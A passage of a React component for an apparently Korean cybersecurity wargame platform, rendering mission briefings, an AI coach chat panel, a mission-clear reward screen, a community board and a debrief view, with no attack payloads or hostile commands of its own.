                    onClick={() => setIsAiCoachOpen((prev) => !prev)}
                    style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '12px 20px', fontWeight: 900, fontSize: '13px', cursor: 'pointer', borderRadius: '4px', background: 'rgba(5,9,20,0.92)', border: `1px solid ${isAiCoachOpen ? '#a855f7' : 'rgba(168,85,247,0.4)'}`, color: '#a855f7', boxShadow: isAiCoachOpen ? '0 0 25px rgba(168,85,247,0.5)' : '0 0 12px rgba(168,85,247,0.2)' }}
                  >
                    🤖 AI 보안 코치 {isAiCoachOpen ? '닫기' : '열기'}
                  </button>
                </div>
              </div>

              {/* Mission Briefing Modal (열고 닫을 수 있는 단일 창) */}
              {isMissionModalOpen && (
                <div
                  onClick={() => setIsMissionModalOpen(false)}
                  style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)', backdropFilter: 'blur(4px)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 200 }}
                >
                  <div
                    onClick={(e) => e.stopPropagation()}
                    className="cyber-card-main"
                    style={{ width: 'min(680px, 92vw)', maxHeight: '82vh', display: 'flex', flexDirection: 'column', padding: 0, borderColor: '#00f2fe', boxShadow: '0 0 40px rgba(0,242,254,0.35)' }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 20px', borderBottom: '1px solid rgba(0,242,254,0.25)' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                        <span style={{ color: '#00f2fe', fontWeight: 900, fontSize: '14px' }}>📋 미션 브리핑</span>
                        {levelTierOf(currentProblem) === 1 && (
                          <button onClick={() => { setBriefingStep(0); setBriefingGuideDone(false); }} style={{ background: 'rgba(0,242,254,0.1)', border: '1px solid rgba(0,242,254,0.4)', color: '#7dd3fc', fontSize: '11px', fontWeight: 'bold', padding: '4px 10px', borderRadius: '4px', cursor: 'pointer' }}>
                            🔰 설명 다시 듣기
                          </button>
                        )}
                      </div>
                      <button onClick={() => setIsMissionModalOpen(false)} style={{ background: 'transparent', border: 'none', color: '#94a3b8', fontSize: '18px', cursor: 'pointer', lineHeight: 1 }}>✕</button>
                    </div>

                    {/* 시나리오 / 소스 코드 / 보안 이론을 탭 전환 없이 한 페이지에서 순서대로 스크롤해 보여줌
                        (파일럿 테스트에서 "탭을 넘나들며 헤매게 된다"는 피드백에 따라 통합) */}
                    <div style={{ padding: '20px', overflowY: 'auto', flex: 1 }}>
                      <div ref={briefingScenarioRef}>
                        {currentProblem.level === 'Tutorial' && categoryPrimers[currentProblem.category] && (
                          <div style={{ padding: '14px 16px', marginBottom: '16px', background: 'rgba(16,185,129,0.08)', border: '1px solid rgba(16,185,129,0.35)', borderLeft: '4px solid #10b981' }}>
                            <div style={{ fontSize: '11px', color: '#10b981', fontWeight: 900, letterSpacing: '1px', marginBottom: '4px' }}>🔰 처음이신가요? — {currentProblem.category}가 뭔가요?</div>
                            <div style={{ fontSize: '13px', color: '#d1fae5', lineHeight: '1.75' }}>{categoryPrimers[currentProblem.category]}</div>
                          </div>
                        )}
                        <div style={{ display: 'flex', gap: '8px', marginBottom: '14px', flexWrap: 'wrap' }}>
                          <span style={{ fontSize: '11px', color: '#00f2fe', border: '1px solid rgba(0,242,254,0.4)', padding: '3px 10px', fontWeight: 'bold' }}>{currentProblem.category}</span>
                          <span style={{ fontSize: '11px', color: currentProblem.role === 'Hacking' ? '#ef4444' : '#10b981', border: `1px solid ${currentProblem.role === 'Hacking' ? '#ef4444' : '#10b981'}`, padding: '3px 10px', fontWeight: 'bold' }}>{currentProblem.role === 'Hacking' ? '🗡 공격 실습' : '🛡 방어 실습'}</span>
                          <span style={{ fontSize: '11px', color: '#facc15', border: '1px solid rgba(250,204,21,0.4)', padding: '3px 10px', fontWeight: 'bold' }}>난이도: {currentProblem.level}</span>
                        </div>

                        <div style={{ padding: '14px 16px', marginBottom: '18px', background: 'rgba(0,242,254,0.06)', border: '1px solid rgba(0,242,254,0.3)', borderLeft: '4px solid #00f2fe' }}>
                          <div style={{ fontSize: '11px', color: '#00f2fe', fontWeight: 900, letterSpacing: '1px', marginBottom: '4px' }}>🎯 이번 문제에서 할 일</div>
                          <div style={{ fontSize: '13px', color: '#e2e8f0', lineHeight: '1.7' }}>
                            {currentProblem.role === 'Hacking'
                              ? '아래 상황과 취약한 코드를 읽고, 터미널에 공격 페이로드를 입력해 시스템 취약점을 뚫으세요. 성공하면 FLAG가 표시됩니다.'
                              : '아래 상황과 취약한 코드를 읽고, 터미널에 이 취약점을 막는 안전한 코드(방어 패치)를 입력하세요. 성공하면 FLAG가 표시됩니다.'}
                          </div>
                          <div style={{ marginTop: '8px', fontSize: '12px', color: '#94a3b8', lineHeight: '1.6' }}>
                            ⚠ 아래 '소스 코드'는 <b>수정하는 곳이 아니라 참고용</b>입니다. 이 미션 브리핑 창을 닫으면 보이는 검은색 터미널의 <b>$ 입력창</b>에 정답 문자열만 그대로 타이핑해서 RUN을 누르세요.
                          </div>
                        </div>

                        {/* "이 구역이 무엇인지" 한눈에 보이도록 박스 테두리 + 번호 배지로 명확히 구획함.
                            워크스루가 이 단계를 가리키는 동안엔 박스 자신의 테두리가 직접 빛나므로
                            (별도 오버레이가 위치를 따라가는 방식이 아니라 박스 스스로 빛나는 방식이라 위치가 절대 어긋나지 않음) */}
                        <div
                          className={levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 0 ? 'pt-box-active' : ''}
                          style={{ position: 'relative', border: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 0 ? '4px solid #ffffff' : '1px solid rgba(0,242,254,0.35)', borderRadius: '8px', padding: '16px', background: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 0 ? 'rgba(255,255,255,0.16)' : 'rgba(0,242,254,0.02)' }}
                        >
                          {levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 0 && (
                            <span style={{ position: 'absolute', top: '-11px', left: '14px', background: '#00f2fe', color: '#02040a', fontSize: '11px', fontWeight: 900, padding: '2px 10px', borderRadius: '4px', boxShadow: '0 0 10px rgba(0,242,254,0.5)' }}>1단계</span>
                          )}
                          <h4 style={{ color: '#00f2fe', margin: '0 0 10px 0', fontSize: '14px' }}>📖 상황 설명 (시나리오)</h4>
                          <div style={{ fontSize: '14px', color: '#cbd5e1', lineHeight: '1.95' }} dangerouslySetInnerHTML={{ __html: currentProblem.desc }} />
                        </div>
                        <button onClick={() => setShowHint((prev) => !prev)} style={{ marginTop: '18px', background: 'rgba(250,204,21,0.1)', border: '1px solid #facc15', color: '#facc15', padding: '8px 16px', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}>
                          💡 막히면 힌트 {showHint ? '숨기기' : '보기'}
                        </button>
                        {showHint && (
                          <div style={{ marginTop: '12px', padding: '14px', background: 'rgba(250,204,21,0.1)', border: '1px solid #facc15', color: '#facc15', fontSize: '13px', lineHeight: '1.7' }}>
                            💡 <b>힌트:</b> {currentProblem.hint}
                          </div>
                        )}
                      </div>

                      <div style={{ margin: '26px 0', borderTop: '1px dashed rgba(0,242,254,0.25)' }} />

                      <div
                        ref={briefingCodeRef}
                        className={levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 2 ? 'pt-box-active' : ''}
                        style={{ position: 'relative', border: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 2 ? '4px solid #ffffff' : '1px solid rgba(0,242,254,0.35)', borderRadius: '8px', padding: '16px', background: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 2 ? 'rgba(255,255,255,0.16)' : 'rgba(0,242,254,0.02)' }}
                      >
                        {levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 2 && (
                          <span style={{ position: 'absolute', top: '-11px', left: '14px', background: '#00f2fe', color: '#02040a', fontSize: '11px', fontWeight: 900, padding: '2px 10px', borderRadius: '4px', boxShadow: '0 0 10px rgba(0,242,254,0.5)' }}>3단계</span>
                        )}
                        <div style={{ fontSize: '11px', color: '#00f2fe', letterSpacing: '1px', fontWeight: 'bold', marginBottom: '10px' }}>
                          ⌨ 소스 코드 ({currentProblem.language.toUpperCase()}) — 읽기 전용 참고 자료
                        </div>
                        <div style={{ marginBottom: '12px', padding: '10px 12px', border: '1px solid rgba(16,185,129,0.4)', background: 'rgba(16,185,129,0.08)', color: '#a7f3d0', fontSize: '12px', lineHeight: '1.6' }}>
                          📌 이 코드는 <b>수정하거나 제출하는 곳이 아닙니다.</b> 왜 이 시스템이 취약한지 이해를 돕는 참고 자료일 뿐입니다. 정답은 이 코드를 고쳐 쓰는 게 아니라, 이 창을 닫고 하단 검은 터미널의 <code>$</code> 입력창에 정답 문자열을 그대로 타이핑해서 RUN 버튼(또는 Enter)을 누르는 것입니다.
                        </div>
                        <pre style={{ margin: 0, padding: '16px', background: '#010407', border: '1px solid rgba(0,242,254,0.2)', color: '#e2e8f0', fontFamily: 'Consolas, monospace', fontSize: '13px', lineHeight: '1.6', overflowX: 'auto', whiteSpace: 'pre-wrap' }}>
                          <code>{currentProblem.code}</code>
                        </pre>
                        {levelTierOf(currentProblem) === 1 && (
                          <div style={{ marginTop: '10px', padding: '10px 12px', border: '1px solid rgba(250,204,21,0.4)', background: 'rgba(250,204,21,0.06)', color: '#fde68a', fontSize: '11px', lineHeight: '1.7' }}>
                            🔎 위 코드에 정답으로 강조된 값( <span className="pt-answer" style={{ fontSize: '10px', padding: '1px 6px' }}>노란색</span> 표시)이 그대로 들어가면 코드가 실제로 어떻게 동작이 바뀌는지, 위 '상황 설명'의 강조된 부분에서 확인할 수 있습니다.
                          </div>
                        )}
                        <div style={{ marginTop: '12px', padding: '10px', border: '1px solid rgba(244,63,94,0.3)', background: 'rgba(244,63,94,0.08)', color: '#f43f5e', fontSize: '11px', fontWeight: 'bold' }}>
                          ⚠ 이 코드에는 실제 시스템에 적용 가능한 취약점 및 보안 패턴이 포함되어 있습니다.
                        </div>
                      </div>

                      <div style={{ margin: '26px 0', borderTop: '1px dashed rgba(0,242,254,0.25)' }} />

                      <div>
                        <h4 style={{ color: '#a855f7', margin: '0 0 12px 0', fontSize: '14px' }}>📖 {currentProblem.cwe || 'CWE 보안 취약성 정의'}</h4>
                        <p style={{ fontSize: '13px', color: '#cbd5e1', lineHeight: '1.7' }}>
                          이 취약점은 외부에서 유입되는 입력 데이터의 문법적 무력화 또는 적절한 인코딩 부재로 인해 발생합니다. 시큐어 코딩 지침에 따라 파라미터화 및 엄격한 데이터 바인딩을 적용해야 합니다.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* AI Security Coach Drawer (미션 브리핑과 별개로 독립적으로 열고 닫음) */}
              {isAiCoachOpen && (
                <div style={{ position: 'fixed', right: '30px', bottom: '90px', width: 'min(380px, 90vw)', height: 'min(520px, 70vh)', background: '#05111f', border: '1px solid #a855f7', boxShadow: '0 0 30px rgba(168,85,247,0.4)', borderRadius: '6px', display: 'flex', flexDirection: 'column', overflow: 'hidden', zIndex: 200 }}>
                  <div style={{ height: '42px', padding: '10px 14px', borderBottom: '1px solid rgba(168,85,247,0.3)', color: '#a855f7', fontWeight: 'bold', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span>🤖 AI 보안 코치</span>
                    <button onClick={() => setIsAiCoachOpen(false)} style={{ background: 'transparent', border: 'none', color: '#94a3b8', fontSize: '16px', cursor: 'pointer', lineHeight: 1 }}>✕</button>
                  </div>

                  <div style={{ flex: 1, minHeight: 0, padding: '14px', overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '10px' }}>
                    {aiMessages.map((msg, idx) => (
                      <div key={idx} style={{ alignSelf: msg.role === 'user' ? 'flex-end' : 'flex-start', maxWidth: '92%' }}>
                        <div style={{ fontSize: '10px', color: '#64748b', marginBottom: '2px', textAlign: msg.role === 'user' ? 'right' : 'left' }}>
                          {msg.role === 'user' ? 'YOU' : 'AI COACH'}
                        </div>
                        <div style={{ padding: '10px 12px', fontSize: '12px', lineHeight: '1.6', background: msg.role === 'user' ? 'rgba(0,242,254,0.1)' : 'rgba(15,23,42,0.9)', border: msg.role === 'user' ? '1px solid rgba(0,242,254,0.3)' : '1px solid rgba(148,163,184,0.2)', color: '#cbd5e1' }}>
                          {msg.text}
                        </div>
                      </div>
                    ))}
                    <div ref={chatEndRef} />
                  </div>

                  {/* AI Quick Prompts & Input */}
                  <div style={{ padding: '10px', borderTop: '1px solid rgba(168,85,247,0.25)' }}>
                    <div style={{ display: 'flex', gap: '4px', marginBottom: '6px', flexWrap: 'wrap' }}>
                      {['힌트 알려줘', '취약점 원리가 뭐야?', '방어 코드 어떻게 짜?'].map(q => (
                        <button key={q} onClick={() => sendAiMessage(q)} style={{ background: 'rgba(168,85,247,0.08)', border: '1px solid rgba(168,85,247,0.3)', color: '#d8b4fe', fontSize: '10px', padding: '4px 6px', cursor: 'pointer' }}>
                          {q}
                        </button>
                      ))}
                    </div>
                    <div style={{ display: 'flex', gap: '6px' }}>
                      <input
                        type="text"
                        value={aiInput}
                        onChange={(e) => setAiInput(e.target.value)}
                        onKeyDown={(e) => { if (e.key === 'Enter') sendAiMessage(); }}
                        placeholder="AI 코치에게 질문..."
                        style={{ flex: 1, padding: '8px', background: '#020407', border: '1px solid rgba(168,85,247,0.3)', color: '#fff', outline: 'none', fontSize: '12px' }}
                      />
                      <button onClick={() => sendAiMessage()} style={{ background: 'rgba(168,85,247,0.15)', border: '1px solid #a855f7', color: '#d8b4fe', padding: '8px 12px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer' }}>
                        전송
                      </button>
                    </div>
                  </div>
                </div>
              )}

            </div>
          )}

          {/* ==========================================
              VIEW: ARENA CLEAR (작전 완료 승리 모달)
             ========================================== */}
          {currentView === 'arena_clear' && (
            <div style={{ width: '100%', height: '100%', padding: '40px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <div className="cyber-card-main clear-card-pulse" style={{ width: 'min(800px, 90vw)', padding: '36px', textAlign: 'center', borderColor: '#10b981' }}>
                <div style={{ fontSize: '13px', color: '#10b981', letterSpacing: '3px', fontWeight: 'bold', marginBottom: '8px' }}>{isRunMode ? `실전 런 ${runIndex + 1} / ${runQueue.length} 완료` : 'OPERATION COMPLETE'}</div>
                <h1 className="neon-forge-cyan" style={{ margin: 0, fontSize: '38px', fontWeight: 900 }}>MISSION CLEAR</h1>
                <p style={{ margin: '10px 0 25px', color: '#94a3b8' }}>
                  {clearRewardKind === 'first'
                    ? 'FLAG 검증이 완료되었습니다. 작전 기록과 경험치가 에이전트 프로필에 기록되었습니다.'
                    : clearRewardKind === 'replay'
                      ? `이미 클리어한 문제를 다시 풀었습니다. 재풀이 보상으로 XP 20%가 지급됩니다 (재풀이 보상 ${(replayCounts[currentProblem.id] || 0)}/3회 사용).`
                      : '이미 클리어한 문제입니다. 재풀이 보상(3회)을 모두 사용해서, 이번엔 추가 XP가 지급되지 않습니다.'}
                </p>

                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '15px', maxWidth: '650px', margin: '0 auto 25px' }}>
                  <div style={{ padding: '16px', background: 'rgba(16,185,129,0.1)', border: '1px solid rgba(16,185,129,0.3)' }}>
                    <div style={{ fontSize: '11px', color: '#86efac' }}>획득한 XP</div>
                    <div style={{ fontSize: '26px', color: '#10b981', fontWeight: 'bold', marginTop: '4px' }}>+{clearRewardXp}</div>
                  </div>
                  <div style={{ padding: '16px', background: 'rgba(0,242,254,0.1)', border: '1px solid rgba(0,242,254,0.3)' }}>
                    <div style={{ fontSize: '11px', color: '#7dd3fc' }}>소요 시간</div>
                    <div style={{ fontSize: '26px', color: '#00f2fe', fontWeight: 'bold', marginTop: '4px' }}>{clearTimeText}</div>
                  </div>
                  <div style={{ padding: '16px', background: 'rgba(244,63,94,0.1)', border: '1px solid rgba(244,63,94,0.3)' }}>
                    <div style={{ fontSize: '11px', color: '#fda4af' }}>작전 섹터</div>
                    <div style={{ fontSize: '20px', color: '#f43f5e', fontWeight: 'bold', marginTop: '4px' }}>{currentProblem.category.split(' ')[0]}</div>
                  </div>
                </div>

                {isRunMode ? (
                  <div style={{ display: 'flex', gap: '15px', justifyContent: 'center' }}>
                    <button onClick={cancelRun} className="cyber-action-block" style={{ padding: '14px 28px', color: '#94a3b8', fontWeight: 'bold', cursor: 'pointer' }}>
                      런 종료
                    </button>
                    <button onClick={advanceRun} className="cyber-action-block" style={{ padding: '14px 28px', color: '#10b981', fontWeight: 'bold', cursor: 'pointer' }}>
                      {runIndex + 1 < runQueue.length ? `다음 챌린지로 (${runIndex + 2}/${runQueue.length}) →` : '🏆 실전 런 완료 — 결과 보기'}
                    </button>
                  </div>
                ) : (
                  <div style={{ display: 'flex', gap: '15px', justifyContent: 'center' }}>
                    <button onClick={() => { setWargameStage('hub'); setCurrentView('wargames'); }} className="cyber-action-block" style={{ padding: '14px 28px', color: '#00f2fe', fontWeight: 'bold', cursor: 'pointer' }}>
                      섹터 목록으로
                    </button>
                    <button onClick={() => startProblemSession(currentProblem)} className="cyber-action-block" style={{ padding: '14px 28px', color: '#10b981', fontWeight: 'bold', cursor: 'pointer' }}>
                      다시하기
                    </button>
                    <button onClick={() => setCurrentView('community')} className="cyber-action-block" style={{ padding: '14px 28px', color: '#facc15', fontWeight: 'bold', cursor: 'pointer' }}>
                      공략 팁 공유하기
                    </button>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* ==========================================
              VIEW: 사용자 커뮤니티 (User Community)
             ========================================== */}
          {currentView === 'community' && (() => {
            const query = communitySearch.trim().toLowerCase();
            let scoped = communityTab === 'best' ? [...posts].sort((a, b) => b.likes - a.likes) : posts.filter((p) => (p.category ?? 'free') === communityTab);
            const filteredPosts = query
              ? scoped.filter((p) => p.title.toLowerCase().includes(query) || p.content.toLowerCase().includes(query) || p.author.toLowerCase().includes(query))
              : scoped;
            const selectedPost = posts.find((p) => p.id === selectedPostId) ?? null;

            const TabBtn = (tab: 'problem' | 'free' | 'best', label: string) => (
              <button
                onClick={() => setCommunityTab(tab)}
                style={{ padding: '8px 18px', fontSize: '13px', fontWeight: 'bold', cursor: 'pointer', background: communityTab === tab ? 'rgba(0,242,254,0.15)' : 'transparent', border: communityTab === tab ? '1px solid #00f2fe' : '1px solid rgba(255,255,255,0.1)', color: communityTab === tab ? '#00f2fe' : '#94a3b8' }}
              >
                {label}
              </button>
            );

            return (
              <div style={{ width: '90%', maxWidth: '900px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end' }}>
                  <div>
                    <div style={{ fontSize: '12px', color: '#10b981', fontWeight: 'bold' }}>USER COMMUNITY</div>
                    <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>👥 사용자 커뮤니티</h2>
                    <p style={{ margin: '4px 0 0', fontSize: '13px', color: '#94a3b8' }}>문제 관련 질문/팁은 문제 커뮤에, 그 외 이야기는 자유 커뮤에 남겨보세요.</p>
                  </div>
                  <button
                    onClick={() => { setComposeCategory(communityTab === 'problem' ? 'problem' : 'free'); setIsPostComposeOpen(true); }}
                    className="cyber-btn-cyan"
                    style={{ padding: '10px 22px', fontSize: '13px', fontWeight: 'bold', whiteSpace: 'nowrap' }}
                  >
                    ✍️ 글쓰기
                  </button>
                </div>

                {/* Tabs */}
                <div style={{ display: 'flex', gap: '8px' }}>
                  {TabBtn('free', '💬 자유 커뮤')}
                  {TabBtn('problem', '🧩 문제 커뮤')}
                  {TabBtn('best', '🔥 BEST (좋아요순)')}
                </div>

                {/* Search */}
                <input
                  type="text"
                  value={communitySearch}
                  onChange={(e) => setCommunitySearch(e.target.value)}
                  placeholder="🔍 제목, 내용, 작성자로 검색..."
                  style={{ width: '100%', padding: '12px 16px', background: '#010307', border: '1px solid rgba(0,242,254,0.3)', color: '#fff', outline: 'none', fontSize: '13px' }}
                />

                {/* Title-only List (Naver Blog style) */}
                <div className="cyber-card-main" style={{ padding: 0, overflow: 'hidden' }}>
                  {filteredPosts.length === 0 && (
                    <div style={{ padding: '30px', textAlign: 'center', color: '#64748b', fontSize: '13px' }}>게시글이 없습니다.</div>
                  )}
                  {filteredPosts.map((post) => (
                    <div
                      key={post.id}
                      onClick={() => handleOpenPost(post.id)}
                      style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '16px 20px', borderBottom: '1px solid rgba(255,255,255,0.05)', cursor: 'pointer' }}
                    >
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px', minWidth: 0 }}>
                        <span style={{ fontSize: '11px', color: post.category === 'problem' ? '#a855f7' : '#10b981', border: `1px solid ${post.category === 'problem' ? '#a855f7' : '#10b981'}`, padding: '2px 6px', flexShrink: 0 }}>{post.category === 'problem' ? '문제' : '자유'}</span>
                        <span style={{ color: '#fff', fontWeight: 'bold', fontSize: '14px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{post.title}</span>
                      </div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '14px', flexShrink: 0 }}>
                        <span style={{ color: '#facc15', fontSize: '12px' }}>♥ {post.likes}</span>
                        <span style={{ color: '#64748b', fontSize: '12px' }}>{post.author}</span>
                        <span style={{ color: '#475569', fontSize: '11px' }}>{post.created_at}</span>
                      </div>
                    </div>
                  ))}
                </div>

                {/* Compose Modal */}
                {isPostComposeOpen && (
                  <div onClick={() => setIsPostComposeOpen(false)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)', backdropFilter: 'blur(4px)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 200 }}>
                    <div onClick={(e) => e.stopPropagation()} className="cyber-card-main" style={{ width: 'min(560px, 92vw)', padding: 0, borderColor: '#00f2fe', boxShadow: '0 0 40px rgba(0,242,254,0.35)' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 20px', borderBottom: '1px solid rgba(0,242,254,0.25)' }}>
                        <span style={{ color: '#00f2fe', fontWeight: 900, fontSize: '14px' }}>✍️ 글쓰기</span>
                        <button onClick={() => setIsPostComposeOpen(false)} style={{ background: 'transparent', border: 'none', color: '#94a3b8', fontSize: '18px', cursor: 'pointer', lineHeight: 1 }}>✕</button>
                      </div>
                      <div style={{ padding: '20px' }}>
                        <div style={{ display: 'flex', gap: '8px', marginBottom: '14px' }}>
                          <button onClick={() => setComposeCategory('free')} style={{ flex: 1, padding: '8px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', background: composeCategory === 'free' ? 'rgba(16,185,129,0.15)' : 'transparent', border: `1px solid ${composeCategory === 'free' ? '#10b981' : 'rgba(255,255,255,0.15)'}`, color: composeCategory === 'free' ? '#10b981' : '#94a3b8' }}>💬 자유 커뮤</button>
                          <button onClick={() => setComposeCategory('problem')} style={{ flex: 1, padding: '8px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', background: composeCategory === 'problem' ? 'rgba(168,85,247,0.15)' : 'transparent', border: `1px solid ${composeCategory === 'problem' ? '#a855f7' : 'rgba(255,255,255,0.15)'}`, color: composeCategory === 'problem' ? '#a855f7' : '#94a3b8' }}>🧩 문제 커뮤</button>
                        </div>
                        <input
                          type="text"
                          value={postTitleInput}
                          onChange={(e) => setPostTitleInput(e.target.value)}
                          placeholder="제목을 입력하세요"
                          style={{ width: '100%', padding: '12px', background: '#010307', border: '1px solid rgba(0,242,254,0.3)', color: '#fff', outline: 'none', marginBottom: '12px', fontSize: '13px' }}
                        />
                        <textarea
                          value={postContentInput}
                          onChange={(e) => setPostContentInput(e.target.value)}
                          rows={6}
                          placeholder="내용을 작성하세요..."
                          style={{ width: '100%', padding: '12px', background: '#010307', border: '1px solid rgba(0,242,254,0.3)', color: '#fff', outline: 'none', marginBottom: '14px', fontSize: '13px', resize: 'vertical' }}
                        />
                        <button
                          onClick={async () => { await handleCreatePost(); setIsPostComposeOpen(false); }}
                          className="cyber-btn-cyan"
                          style={{ padding: '10px 24px', fontSize: '13px' }}
                        >
                          <i className="fa-solid fa-paper-plane"></i> 게시하기
                        </button>
                      </div>
                    </div>
                  </div>
                )}

                {/* Post Detail Modal */}
                {selectedPost && (
                  <div onClick={() => setSelectedPostId(null)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)', backdropFilter: 'blur(4px)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 200 }}>
                    <div onClick={(e) => e.stopPropagation()} className="cyber-card-main" style={{ width: 'min(640px, 92vw)', maxHeight: '82vh', display: 'flex', flexDirection: 'column', padding: 0, borderColor: '#00f2fe', boxShadow: '0 0 40px rgba(0,242,254,0.35)' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 20px', borderBottom: '1px solid rgba(0,242,254,0.25)' }}>
                        <span style={{ color: '#00f2fe', fontWeight: 900, fontSize: '14px' }}>{selectedPost.category === 'problem' ? '🧩 문제 커뮤' : '💬 자유 커뮤'}</span>
                        <button onClick={() => setSelectedPostId(null)} style={{ background: 'transparent', border: 'none', color: '#94a3b8', fontSize: '18px', cursor: 'pointer', lineHeight: 1 }}>✕</button>
                      </div>
                      <div style={{ padding: '24px', overflowY: 'auto' }}>
                        <h3 style={{ margin: '0 0 10px 0', color: '#fff', fontSize: '20px' }}>{selectedPost.title}</h3>
                        <div style={{ display: 'flex', gap: '12px', marginBottom: '18px', fontSize: '12px', color: '#64748b', alignItems: 'center' }}>
                          <span style={{ color: '#00f2fe' }}>⚡ {selectedPost.author}</span>
                          <span>{selectedPost.created_at}</span>
                          <button
                            onClick={() => handleToggleLike(selectedPost.id)}
                            disabled={likedPostIds.includes(selectedPost.id)}
                            style={{ marginLeft: 'auto', background: likedPostIds.includes(selectedPost.id) ? 'rgba(250,204,21,0.15)' : 'transparent', border: '1px solid #facc15', color: '#facc15', padding: '4px 12px', fontSize: '12px', fontWeight: 'bold', cursor: likedPostIds.includes(selectedPost.id) ? 'default' : 'pointer' }}
                          >
                            ♥ 좋아요 {selectedPost.likes}
                          </button>
                        </div>
                        <p style={{ margin: '0 0 20px 0', color: '#cbd5e1', fontSize: '14px', lineHeight: '1.8', whiteSpace: 'pre-wrap' }}>{selectedPost.content}</p>

                        {/* Comments */}
                        <div style={{ borderTop: '1px solid rgba(255,255,255,0.08)', paddingTop: '16px' }}>
                          <div style={{ fontSize: '12px', color: '#00f2fe', fontWeight: 'bold', marginBottom: '10px' }}>💬 댓글 {postComments.length}</div>
                          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', marginBottom: '14px' }}>
                            {postComments.map((c) => (
                              <div key={c.id} style={{ padding: '10px 12px', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)' }}>
                                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', color: '#64748b', marginBottom: '4px' }}>
                                  <span style={{ color: '#00f2fe', fontWeight: 'bold' }}>{c.author}</span>
                                  <span>{c.created_at}</span>
                                </div>
                                <div style={{ fontSize: '13px', color: '#e2e8f0' }}>{c.content}</div>
                              </div>
                            ))}
                          </div>
                          <div style={{ display: 'flex', gap: '8px' }}>
                            <input
                              type="text"
                              value={commentInput}
                              onChange={(e) => setCommentInput(e.target.value)}
                              onKeyDown={(e) => { if (e.key === 'Enter') handleAddComment(selectedPost.id); }}
                              placeholder="댓글을 입력하세요..."
                              style={{ flex: 1, padding: '10px', background: '#010307', border: '1px solid rgba(0,242,254,0.3)', color: '#fff', outline: 'none', fontSize: '12px' }}
                            />
                            <button onClick={() => handleAddComment(selectedPost.id)} className="cyber-btn-cyan" style={{ padding: '8px 16px', fontSize: '12px' }}>등록</button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            );
          })()}

          {/* ==========================================
              VIEW: 오답 노트 (Debrief)
             ========================================== */}
          {currentView === 'debrief' && (() => {
            const wrongProblems = wrongProblemIds
              .map((id) => masterProblemDB.find((p) => p.id === id))
              .filter((p): p is ProblemItem => !!p)
              .filter((p) => debriefCategoryFilter === 'ALL' || p.category === debriefCategoryFilter);
            const clearedCount = wrongProblems.filter((p) => effectiveSolvedIds.includes(p.id)).length;
            const unsolvedCount = wrongProblems.length - clearedCount;
            const killRate = wrongProblems.length === 0 ? 100 : Math.round((clearedCount / wrongProblems.length) * 100);

            return (
              <div style={{ width: '90%', maxWidth: '1100px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end' }}>
                  <div>
                    <div style={{ fontSize: '12px', color: '#f43f5e', fontWeight: 'bold' }}>TACTICAL INCIDENT DEBRIEF</div>
                    <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>📓 전술 오답 노트 & 시큐어 패치 리포트</h2>
                    <p style={{ margin: '4px 0 0', fontSize: '13px', color: '#94a3b8' }}>워게임 침투 및 방어 실패 로그를 분석하고 FLAG를 틀렸던 문제를 다시 도전합니다.</p>
                  </div>
                  {clearedCount > 0 && (
                    <button onClick={() => setWrongProblemIds((prev) => prev.filter((id) => !effectiveSolvedIds.includes(id)))} style={{ background: 'transparent', border: '1px solid #475569', color: '#94a3b8', padding: '8px 14px', fontSize: '12px', cursor: 'pointer', whiteSpace: 'nowrap' }}>
                      정복 완료 오답 정리
                    </button>
                  )}
                </div>

                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '15px' }}>
                  <div className="cyber-card-main" style={{ padding: '16px' }}>
                    <div style={{ fontSize: '11px', color: '#64748b' }}>총 실패/오답 기록</div>
